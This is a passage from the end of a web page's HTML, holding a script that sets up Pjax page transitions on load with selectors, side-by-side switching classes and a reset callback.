  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>